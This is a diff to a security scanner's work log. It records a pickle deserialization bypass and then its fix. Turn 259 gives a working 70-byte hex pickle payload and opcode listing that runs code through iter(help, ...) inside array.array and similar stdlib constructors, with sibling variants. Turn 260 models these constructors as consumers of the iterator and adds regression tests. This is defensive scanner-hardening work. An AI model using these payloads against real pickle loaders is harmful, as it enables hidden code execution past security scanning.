@@ -16599,3 +16599,226 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3777 passed, 1022 skipped, 21 warnings in 38.99s`.
+
+## Turn 259 - Bypass via clean stdlib iterable materializers
+
+Found another scanner-clean RCE-capable family around clean constructors and
+helpers that consume a tracked two-argument `iter(callable, sentinel)` during
+construction or first pull. These are not dangerous globals by themselves, but
+they execute the callable as part of ordinary iterable consumption.
+
+The smallest construction-time representative is:
+
+```python
+array.array("i", iter(builtins.help, "stop"))
+```
+
+During `pickle.loads`, `array.array(...)` drains the input iterable to populate
+the array. A shadow `pydoc.py` at the front of `sys.path` executes when
+`_sitebuiltins._Helper.__call__` imports `pydoc`, returns integer `7`, then
+returns the sentinel `"stop"`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL builtins iter
+STACK_GLOBAL builtins help
+SHORT_BINUNICODE "stop"
+TUPLE2
+REDUCE              # iter(help, "stop")
+MEMOIZE
+POP
+STACK_GLOBAL array array
+SHORT_BINUNICODE "i"
+BINGET 0
+TUPLE
+REDUCE              # array.array("i", call_iterator), drains input immediately
+STOP
+```
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c0561727261798c05617272617993288c0169680074522e
+```
+
+Scanner proof:
+
+```text
+payload_len 70
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('array', 'array', 60),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('array', 'array', 2, 68),
+]
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime_result array('i', [7])
+runtime_type array
+runtime_list [7]
+marker_exists True
+marker_text owned-by-array-array
+runtime stderr
+```
+
+Sibling probes stayed scanner-clean and executed the same shadow `pydoc.py`
+marker proof:
+
+```text
+collections.Counter len 74 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'Counter', 1, 72),
+]
+runtime_result Counter({'owned-value': 1})
+
+collections.OrderedDict len 78 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'OrderedDict', 1, 76),
+]
+runtime_result OrderedDict({'owned-key': 'owned-value'})
+
+collections.UserList len 75 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'UserList', 1, 73),
+]
+runtime_result ['owned-value']
+
+heapq.merge + next len 89 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('heapq', 'merge', 1, 64),
+  ('builtins', 'next', 1, 87),
+]
+runtime_result 'owned-value'
+```
+
+Why it bypasses:
+
+- The native model tracks `iter(help, "stop")` as `StackValue::CallIterator`.
+- It emits the hidden zero-argument callable only for a finite set of currently
+  modeled consumers: core builtins, `collections.deque`, selected `itertools`
+  adapters, joins, and direct `next(...)`.
+- Clean stdlib materializers such as `array.array`, `collections.Counter`,
+  `OrderedDict`, and `UserList` consume arbitrary iterables but are currently
+  modeled as ordinary constructed values.
+- `heapq.merge(...)` is another clean lazy adapter; after it wraps the
+  `CallIterator`, the later `next(...)` sees only an ordinary constructed
+  object.
+- The Python call graph already knows invoked `builtins.help()` reaches
+  `_sitebuiltins._Helper.__call__ -> builtins.__import__`; the native metadata
+  never emits that hidden invocation for these consumers.
+
+Likely source-level defense:
+
+- Extend the finite `CallIterator` effect model to additional stdlib iterable
+  materializers that drain inputs during construction, starting with
+  `array.array`, `collections.Counter`, `collections.OrderedDict`, and
+  `collections.UserList`.
+- Treat clean lazy adapters such as `heapq.merge(call_iterator, ...)` like the
+  existing lazy wrapper family so direct `next(...)` and eager consumers can
+  report the hidden callable.
+- Keep the implementation reducer-local: inspect only the reducer callable and
+  already-decoded argument stack values.
+
+Performance note:
+
+- The representative payload is 70 bytes.
+- Warm scan median over 1000 runs was `0.000054s`, p95 `0.000070s`, and max
+  `0.001656s`.
+
+## Turn 260 - Defense for stdlib iterable materializers
+
+Blocked Turn 259 at the finite call-iterator source. The fix keeps clean
+stdlib constructors clean as symbols, but treats them as consumers when their
+arguments include a tracked two-argument `iter(callable, sentinel)`.
+
+Implementation:
+
+- Modeled construction-time drains for `array.array(typecode, iterable)`,
+  `collections.Counter(iterable)`, `collections.OrderedDict(iterable)`, and
+  `collections.UserList(iterable)`.
+- Modeled `heapq.merge(call_iterator, ...)` as a lazy wrapper, so existing
+  `next(...)`/eager-consumer handling emits the hidden callable when the merge
+  result is pulled.
+- Kept the implementation reducer-local: it inspects only reducer callable
+  identity and already-tracked argument stack values.
+
+Regression coverage:
+
+- Added malicious positive regressions for the Turn 259 representative
+  `array.array("i", iter(help, "stop"))`.
+- Added sibling positives for `Counter`, `OrderedDict`, `UserList`, and
+  `next(heapq.merge(...))`.
+- Each regression asserts the hidden zero-argument `builtins.help()` invocation
+  and the `_sitebuiltins._Helper.__call__ -> builtins.__import__` call-graph
+  finding, then proves runtime reachability with a shadow `pydoc.py` in a child
+  interpreter.
+
+Post-fix proof for the Turn 259 representative:
+
+```text
+payload_len 70
+scan malicious findings 1 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('array', 'array', 60),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('array', 'array', 2, 68),
+  ('builtins', 'help', 0, 68),
+]
+finding critical DANGEROUS_CALL_GRAPH
+sink builtins.__import__
+call_path ('_sitebuiltins._Helper.__call__', 'builtins.__import__')
+```
+
+Runtime proof remains live:
+
+```text
+runtime rc 0
+runtime_result array('i', [7])
+runtime_type array
+runtime_list [7]
+marker_exists True
+marker_text owned-by-array-array
+runtime stderr
+```
+
+Performance note:
+
+- Warm scan median over 1000 post-fix runs was `0.000122s`, p95 `0.000141s`,
+  and max `0.000263s` for the 70-byte representative.
+
+Validation:
+
+- Rust formatting:
+  `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt the local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused new stdlib materializer regressions: `5 passed in 0.48s`.
+- Focused import/call-graph regression file: `67 passed in 2.04s`.
+- Focused call-graph suite: `105 passed in 4.01s`.
+- Focused existing forced-iteration oracle checks: `2 passed in 1.24s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3782 passed, 1022 skipped, 21 warnings in 49.07s`.
